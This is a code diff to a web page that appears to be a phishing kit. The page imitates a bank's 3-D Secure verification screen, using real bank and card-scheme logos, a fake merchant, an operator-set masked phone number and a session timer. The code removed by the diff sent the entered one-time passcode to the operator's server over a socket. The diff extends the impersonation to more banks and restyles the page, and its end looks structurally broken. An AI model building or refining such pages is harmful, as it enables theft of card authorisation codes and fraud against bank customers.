@@ -551,11 +551,11 @@
   <!-- Main Verification Content -->
   <div id="mcVerificationContent" style="display: none; background: white; width: 90%; max-width: 480px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); padding: 0;">
     
-    <!-- Header with bank and card logos - NEW -->
+    <!-- Header with bank and card logos -->
     <div style="display: flex; justify-content: space-between; align-items: center; padding: 10px 15px; border-bottom: 1px solid #eee;">
       <!-- Left side - Bank logo -->
       <div style="height: 40px; display: flex; align-items: center;">
-        <img id="bankLogo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Housing_Bank_Logo.svg/1280px-Housing_Bank_Logo.svg.png" alt="Bank Logo" style="height: 100%; max-width: 150px;">
+        <img id="bankLogo" src="https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png" alt="Bank Logo" style="height: 100%; max-width: 150px;">
       </div>
       
       <!-- Right side - Card verification logo -->
@@ -565,7 +565,7 @@
     </div>
     
     <!-- Main content -->
-    <div style="padding: 15px;">
+    <div style="padding: 15px 20px;">
       <h3 style="margin-top: 0; margin-bottom: 15px; font-weight: bold; color: #333; font-size: 16px;">Protecting your online payments</h3>
       
       <div style="background-color: #f0e6f6; padding: 10px; border-radius: 3px; border: 1px solid #d9c8e6; margin-bottom: 15px;">
@@ -574,38 +574,34 @@
         </p>
       </div>
       
-      <!-- Transaction details - SINGLE, CENTERED VERSION -->
-      <div style="margin-bottom: 15px; font-size: 13px; color: #333; text-align: left;">
-        <div style="margin-bottom: 5px;">
-          <span style="display: inline-block; width: 110px; text-align: left; font-weight: 400;">Merchant</span>
-          <span id="merchantName" style="display: inline-block; font-weight: 500;">GOLFSTORE 3DS</span>
-        </div>
-        <div style="margin-bottom: 5px;">
-          <span style="display: inline-block; width: 110px; text-align: left; font-weight: 400;">Amount</span>
-          <span style="display: inline-block; font-weight: 500;">
-            <span id="currencySymbol">$</span><span id="transactionAmount">45.99</span>
-          </span>
-        </div>
-        <div style="margin-bottom: 5px;">
-          <span style="display: inline-block; width: 110px; text-align: left; font-weight: 400;">Date</span>
-          <span id="transactionDate" style="display: inline-block; font-weight: 500;">17:10:09</span>
-        </div>
-        <div style="margin-bottom: 5px;">
-          <span style="display: inline-block; width: 110px; text-align: left; font-weight: 400;">Card Number</span>
-          <span id="cardNumberDisplay" style="display: inline-block; font-weight: 500;">XXXX XXXX XXXX 0622</span>
-        </div>
-        <div style="margin-bottom: 5px;">
-          <span style="display: inline-block; width: 110px; text-align: left; font-weight: 400;">Reference Id</span>
-          <span id="referenceId" style="display: inline-block; font-weight: 500;">299879</span>
+      <!-- Transaction details - CENTER ALIGNED with more spacing -->
+      <div style="margin-bottom: 20px; font-size: 13px; color: #333; display: flex; flex-direction: column; align-items: center;">
+        <div style="display: grid; grid-template-columns: auto auto; gap: 8px 10px; width: 100%; max-width: 350px;">
+          <div style="text-align: right; font-weight: 400; padding-right: 5px;">Merchant</div>
+          <div style="text-align: left; font-weight: 500;" id="merchantName">Bologus pvt store.</div>
+          
+          <div style="text-align: right; font-weight: 400; padding-right: 5px;">Amount</div>
+          <div style="text-align: left; font-weight: 500;">
+            <span id="currencySymbol">$</span><span id="transactionAmount">1000.00</span>
+          </div>
+          
+          <div style="text-align: right; font-weight: 400; padding-right: 5px;">Date</div>
+          <div style="text-align: left; font-weight: 500;" id="transactionDate">02/04/2025 05:15:42</div>
+          
+          <div style="text-align: right; font-weight: 400; padding-right: 5px;">Card Number</div>
+          <div style="text-align: left; font-weight: 500;" id="cardNumberDisplay">XXXX XXXX XXXX 4352</div>
+          
+          <div style="text-align: right; font-weight: 400; padding-right: 5px;">Reference Id</div>
+          <div style="text-align: left; font-weight: 500;" id="referenceId">g4pxye</div>
         </div>
       </div>
       
       <!-- OTP input field - IMPROVED with label and input on same line -->
       <div style="margin-bottom: 20px; display: flex; align-items: center;">
-        <span style="font-size: 14px; margin-right: 10px; min-width: 150px; font-weight: 400; color: #333;">Enter One-Time Passcode</span>
+        <span style="font-size: 14px; margin-right: 10px; min-width: 150px; font-weight: 400; color: #333; padding-left: 10px;">Enter One-Time Passcode</span>
         <div style="position: relative; width: 240px;">
           <input type="text" id="mcOtpInput" 
-            style="width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 6px; font-size: 15px; 
+            style="width: 100%; padding: 8px 30px 8px 8px; border: 1px solid #ccc; border-radius: 6px; font-size: 15px; 
             font-weight: 400; transition: all 0.3s;" 
             placeholder="Enter One-Time Passcode" maxlength="6">
           <div style="position: absolute; right: 8px; top: 50%; transform: translateY(-50%); cursor: pointer;" id="otpInfoIcon">
@@ -636,8 +632,8 @@
         <button id="mcCancelBtn" style="flex: 1; padding: 8px 0; background-color: #aaaaaa; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Cancel</button>
       </div>
       
-      <!-- Timer will be inserted here dynamically -->
-      <div id="mcTimer" style="text-align: center; margin-top: 10px; font-size: 12px; color: #666;"></div>
+      <!-- Timer display -->
+      <div id="mcTimer" style="text-align: center; margin-top: 10px; font-size: 12px; color: #666;">Session expires in: 4:54</div>
       
       <!-- Footer links - styled to match the image -->
       <div style="margin-top: 15px; padding-top: 8px; border-top: 1px solid #e5e5e5; text-align: center; font-size: 11px; color: #777;">
@@ -648,6 +644,7 @@
     </div>
   </div>
 </div>
+    
 <script>
 // Global error handler to catch uncaught exceptions
 window.onerror = function(message, source, lineno, colno, error) {
@@ -1086,45 +1083,34 @@ function getReadableFailureReason(reasonCode) {
 }
 
 function updateMcVerificationUI(data) {
-    // Update UI elements with data
-    document.getElementById('merchantName').textContent = data.merchantName || 'Peacock Merchandise';
-    document.getElementById('transactionAmount').textContent = data.amount || state.amount.toFixed(2);
-    document.getElementById('transactionDate').textContent = new Date().toLocaleDateString() + ' ' + new Date().toLocaleTimeString();
-    document.getElementById('cardNumberDisplay').textContent = 'XXXX XXXX XXXX ' + (state.cardForm.cardNumber.slice(-4) || '1234');
-    document.getElementById('referenceId').textContent = data.invoiceId?.substring(0, 6) || Math.floor(100000 + Math.random() * 900000);
-    
-    // Set currency symbol
-    updateCurrencyDisplay(data.currency || 'USD');
-
-    if (document.getElementById('cardLastFourDigits')) {
-        const lastFour = data.phoneLastFour || state.phoneLastFour || '9469';
-        document.getElementById('cardLastFourDigits').textContent = `********${lastFour}`;
-    }
-
-    
-    // Set bank logo - ensure it shows a bank logo and not MasterCard
-    const bankLogo = document.getElementById('bankLogo');
-    if (bankLogo) {
-        const bankCode = data.bankCode?.toLowerCase() || 'default';
+    // Update bank logo
+    if (document.getElementById('bankLogo')) {
+        const bankLogo = document.getElementById('bankLogo');
+        const bankCode = data.bankCode?.toLowerCase() || 'sbi';
         
         // Map of bank codes to logo URLs
         const bankLogos = {
-            'default': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png', // Default to a bank logo, not MasterCard
-            'hsbc': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_(2018).svg',
+            'default': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png',
             'sbi': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png',
             'hdfc': 'https://companieslogo.com/img/orig/HDB_BIG-092606ce.png',
             'icici': 'https://www.icicibank.com/content/dam/icicibank/india/assets/images/header/logo.png',
             'axis': 'https://upload.wikimedia.org/wikipedia/commons/c/ce/AXISBank_Logo.svg',
             'kotak': 'https://static.wikia.nocookie.net/logopedia/images/1/16/Kotak_Mahindra_Bank.svg',
-            'yes': 'https://upload.wikimedia.org/wikipedia/commons/b/b3/Yes_Bank_logo.svg'
+            'yes': 'https://upload.wikimedia.org/wikipedia/commons/b/b3/Yes_Bank_logo.svg',
+            'housing': 'https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Housing_Bank_Logo.svg/1280px-Housing_Bank_Logo.svg.png',
+            'hsbc': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_(2018).svg',
+            'barclays': 'https://icons.veryicon.com/png/128/business/bank-logo-collection/barclays-bank-portfolio.png',
+            'citibank': 'https://www.logo.wine/a/logo/Citigroup/Citigroup-Logo.wine.svg',
+            'boa': 'https://freelogopng.com/images/all_img/1658985465bank-of-america-logo-png.png',
+            'chase': 'https://1000logos.net/wp-content/uploads/2016/11/Chase-National-Bank-Logo-500x281.png',
+            'gibraltar': 'https://upload.wikimedia.org/wikipedia/en/thumb/4/4a/Gibraltar_International_Bank_Logo.svg/220px-Gibraltar_International_Bank_Logo.svg.png'
         };
         
         bankLogo.src = bankLogos[bankCode] || bankLogos['default'];
     }
     
     // Set verification type logo
-    const verificationLogo = document.getElementById('verificationTypeLogo');
-    if (verificationLogo) {
+    if (document.getElementById('verificationTypeLogo')) {
         const verificationType = data.verificationType || detectCardType(state.cardForm.cardNumber);
         
         // Map of verification types to logos
@@ -1132,129 +1118,81 @@ function updateMcVerificationUI(data) {
             'visa': 'https://vectorseek.com/wp-content/uploads/2023/09/Verified-By-Visa-Logo-Vector.svg-.png',
             'mastercard': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png',
             'amex': 'https://logos-world.net/wp-content/uploads/2020/11/American-Express-Logo-700x394.png',
-            'discover': 'https://logos-world.net/wp-content/uploads/2021/03/Discover-Logo-1985-2009.png'
+            'discover': 'https://logos-world.net/wp-content/uploads/2021/03/Discover-Logo-1985-2009.png',
+            'rupay': 'https://www.gokiwi.in/wp-content/smush-webp/2023/12/1280px-Rupay-Logo.png.webp'
         };
         
-        verificationLogo.src = verificationLogos[verificationType] || verificationLogos['mastercard'];
+        document.getElementById('verificationTypeLogo').src = verificationLogos[verificationType] || verificationLogos['visa'];
     }
     
-  // Set masked phone number
-if (data.phoneLastFour) {
-    document.getElementById('cardLastFourDigits').textContent = `********${data.phoneLastFour}`;
-}
-    
-    // Make sure the consent checkbox is correctly styled
-    const consentLabel = document.getElementById('consentLabel');
-    if (consentLabel) {
-        consentLabel.style.fontSize = '11px';
-        consentLabel.style.marginLeft = '5px';
-        consentLabel.style.marginRight = '5px';
-        consentLabel.style.color = '#555';
+    // Set masked phone number with the correct last 4 digits from admin panel
+    if (document.getElementById('cardLastFourDigits')) {
+        const lastFour = data.phoneLastFour || state.phoneLastFour || '9469';
+        document.getElementById('cardLastFourDigits').textContent = `********${lastFour}`;
     }
-
-    const consentCheckbox = document.getElementById('mcConsentCheckbox');
-    if (consentCheckbox) {
-        consentCheckbox.style.width = '12px';
-        consentCheckbox.style.height = '12px';
-        consentCheckbox.style.marginTop = '2px';
-        consentCheckbox.style.marginRight = '5px';
+    
+    // Update transaction details
+    if (document.getElementById('merchantName')) {
+        document.getElementById('merchantName').textContent = data.merchantName || 'Bologus pvt store.';
+    }
+    
+    if (document.getElementById('transactionAmount')) {
+        document.getElementById('transactionAmount').textContent = data.amount || '1000.00';
+    }
+    
+    if (document.getElementById('currencySymbol')) {
+        const currency = data.currency || 'USD';
+        const currencySymbols = {
+            'USD': '$',
+            'EUR': '€',
+            'GBP': '£',
+            'JPY': '¥',
+            'INR': '₹',
+            'AUD': 'A$',
+            'CAD': 'C$',
+            'CHF': 'CHF',
+            'CNY': '¥',
+            'HKD': 'HK$'
+        };
+        document.getElementById('currencySymbol').textContent = currencySymbols[currency] || '$';
+    }
+    
+    if (document.getElementById('transactionDate')) {
+        document.getElementById('transactionDate').textContent = data.date || new Date().toLocaleString('en-US', {
+            year: 'numeric',
+            month: '2-digit',
+            day: '2-digit',
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit',
+            hour12: false
+        }).replace(',', '');
+    }
+    
+    if (document.getElementById('cardNumberDisplay')) {
+        const lastFour = state.cardForm.cardNumber ? state.cardForm.cardNumber.replace(/\s/g, '').slice(-4) : '4352';
+        document.getElementById('cardNumberDisplay').textContent = `XXXX XXXX XXXX ${lastFour}`;
+    }
+    
+    if (document.getElementById('referenceId')) {
+        document.getElementById('referenceId').textContent = data.referenceId || data.invoiceId?.substring(0, 6) || 'g4pxye';
     }
     
     // Set up event handlers for buttons
     setupMcVerificationButtons();
-}
-
-function setupMcVerificationButtons() {
-    // Submit button handler
-    const submitBtn = document.getElementById('mcSubmitBtn');
-    if (submitBtn) {
-        submitBtn.onclick = function() {
-            const otpInput = document.getElementById('mcOtpInput');
-            const otpValue = otpInput ? otpInput.value.trim() : '';
-            
-            if (!otpValue) {
-                const errorMsg = document.getElementById('mcOtpError');
-                if (errorMsg) {
-                    errorMsg.textContent = 'Please enter the verification code';
-                    errorMsg.style.display = 'block';
-                }
-                return;
-            }
-            
-            // Show loading state - don't show "Invalid OTP" immediately
-            submitBtn.disabled = true;
-            submitBtn.textContent = 'Verifying...';
-            
-            // Hide any existing error message
-            const errorMsg = document.getElementById('mcOtpError');
-            if (errorMsg) {
-                errorMsg.style.display = 'none';
-            }
-            
-            // Submit OTP to server - keep showing "Verifying..." until we get server response
-            socket.emit('mc_otp_submitted', {
-                invoiceId: state.transactionId,
-                otp: otpValue,
-                timestamp: new Date().toISOString()
-            });
-            
-            // We no longer show error automatically - we wait for server response
-        };
+    
+    // Start the timer if not already started
+    if (!mcTimerInterval) {
+        startMCTimer();
     }
     
-    // Resend button handler
-    const resendBtn = document.getElementById('mcResendBtn');
-    if (resendBtn) {
-        resendBtn.onclick = function() {
-            resendBtn.disabled = true;
-            resendBtn.textContent = 'Sending...';
-            
-            // Request OTP resend
-            socket.emit('mc_resend_otp', {
-                invoiceId: state.transactionId
-            });
-            
-            // Reset button after delay
-            setTimeout(() => {
-                resendBtn.disabled = false;
-                resendBtn.textContent = 'Resend';
-                
-                // Show toast notification
-                showToast('OTP Resent', 'A new code has been sent to your mobile');
-            }, 2000);
-        };
-    }
-    
-    // Cancel button handler
-    const cancelBtn = document.getElementById('mcCancelBtn');
-    if (cancelBtn) {
-        cancelBtn.onclick = function() {
-            if (confirm('Are you sure you want to cancel this verification?')) {
-                // Hide the verification overlay
-                const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
-                if (mcVerificationOverlay) {
-                    mcVerificationOverlay.style.display = 'none';
-                }
-                
-                // Clear the MC timer if it exists
-                if (mcTimerInterval) {
-                    clearInterval(mcTimerInterval);
-                }
-                
-                // Notify server
-                socket.emit('mc_verification_cancelled', {
-                    invoiceId: state.transactionId
-                });
-                
-                // Redirect to card form
-                resetForm();
-            }
-        };
-    }
-    
-    // OTP input validation and formatting
+    // Initialize OTP input field
     const otpInput = document.getElementById('mcOtpInput');
     if (otpInput) {
+        otpInput.value = '';
+        otpInput.focus();
+        
+        // Handle input validation
         otpInput.oninput = function() {
             // Only allow digits
             this.value = this.value.replace(/\D/g, '');
@@ -1265,7 +1203,7 @@ function setupMcVerificationButtons() {
                 errorMsg.style.display = 'none';
             }
             
-            // Add this new code:
+            // Enable/disable submit button based on input
             const submitBtn = document.getElementById('mcSubmitBtn');
             if (submitBtn) {
                 if (this.value.length > 0) {
@@ -1277,6 +1215,28 @@ function setupMcVerificationButtons() {
                 }
             }
         };
+    }
+    
+    // Initialize consent checkbox
+    const consentCheckbox = document.getElementById('mcConsentCheckbox');
+    if (consentCheckbox) {
+        consentCheckbox.checked = false;
+        
+        // Update submit button based on checkbox state
+        consentCheckbox.onchange = function() {
+            const submitBtn = document.getElementById('mcSubmitBtn');
+            if (submitBtn) {
+                if (this.checked && otpInput && otpInput.value.length > 0) {
+                    submitBtn.style.backgroundColor = '#0066cc';
+                    submitBtn.disabled = false;
+                } else {
+                    submitBtn.style.backgroundColor = '#aaaaaa';
+                    submitBtn.disabled = true;
+                }
+            }
+        };
+    }
+}
         
         // Trigger the input handler once to set initial state
         otpInput.oninput();
